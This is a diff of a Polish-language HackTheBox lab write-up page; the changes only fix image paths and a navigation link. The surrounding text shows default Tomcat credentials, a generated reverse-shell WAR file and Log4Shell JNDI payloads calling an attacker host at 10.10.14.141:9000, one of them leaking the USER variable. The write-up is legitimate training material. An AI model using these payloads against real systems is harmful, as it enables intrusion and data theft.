@@ -287,9 +287,9 @@ by Ben <span style="color:#e6db74">&#34;epi&#34;</span> Risher 🤓             
 <span style="color:#f92672">[</span><span style="color:#75715e">####################] - 18s     4697/4697    253/s   http://10.10.11.138/images</span>
 </code></pre></div><hr>
 <h1 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h1>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211231225131.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211231225131.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211231225048.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211231225048.png" alt=""  />
 </p>
 <p>Na stronie głównej nie ma niczego ciekawego</p>
 <hr>
@@ -302,18 +302,18 @@ ftp&gt;
 </code></pre></div><p>Prawdopodobnie port 21 jest zablokowany przez firewall.</p>
 <hr>
 <h1 id="port-80---apache-2441">Port 80 - Apache 2.4.41<a hidden class="anchor" aria-hidden="true" href="#port-80---apache-2441">#</a></h1>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211231231838.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211231231838.png" alt=""  />
 </p>
 <p>Wiadomo, że jest zainstalowany Tomcat 9.0.31 na Ubuntu.</p>
 <p>Miałem już doczynienia z tą wersją. Boxy <code>Seal</code> oraz <code>Tabby</code> również miały tą samą wersje. Widziałem, że musi chodzić o coś z Path Traversal.</p>
 <p><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat">https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat</a></p>
 <p>I faktycznie, przy wykorzystaniu błędu tej wersji możemy dostać się do panelu logowania.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220101033829.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220101033829.png" alt=""  />
 </p>
 <p>Dane do logowania okazały się proste: <code>tomcat:tomcat</code>. Jedne z domyślnych</p>
 <p><a href="https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown">https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown</a></p>
 <p>Tym sposobem dostajemy się do Tomcata</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220101034100.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220101034100.png" alt=""  />
 </p>
 <hr>
 <h2 id="initial-shell">Initial shell<a hidden class="anchor" aria-hidden="true" href="#initial-shell">#</a></h2>
@@ -324,11 +324,11 @@ Payload size: <span style="color:#ae81ff">1088</span> bytes
 Final size of war file: <span style="color:#ae81ff">1088</span> bytes
 Saved as: revshell.war
 </code></pre></div><p>Natomiast przy próbie uploadu dostajemy taki komunikat.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220101034842.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220101034842.png" alt=""  />
 </p>
 <p>W tym momencie nie miałem pomysłu gdzie szukać dalej. Jak się okazało, należy pochylić się nad podatnością Log4J.</p>
 <p>Wklejenie takiego payloadu <code>${jndi:ldap://10.10.14.141:9000/Test}</code>, spowodowało dziwną odpowiedź serwera</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220103023055.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220103023055.png" alt=""  />
 </p>
 <p>${jndi:ldap://10.10.14.141:9000/callback/${env:USER}</p>
 <p>${jndi:ldap://10.10.14.141:9000/callback/${env:USER}}</p>
@@ -350,10 +350,10 @@ Saved as: revshell.war
     <br>
     <span>Horizontall - HackTheBox</span>
   </a>
-  <a class="next" href="https://suszczyk.github.io/posts/tryhackme/brainpan-1/">
+  <a class="next" href="https://suszczyk.github.io/posts/hackthebox/thenotebook/">
     <span class="title">Next Page »</span>
     <br>
-    <span>Brainpan 1</span>
+    <span>The Notebook - HackTheBox</span>
   </a>
 </nav>
 
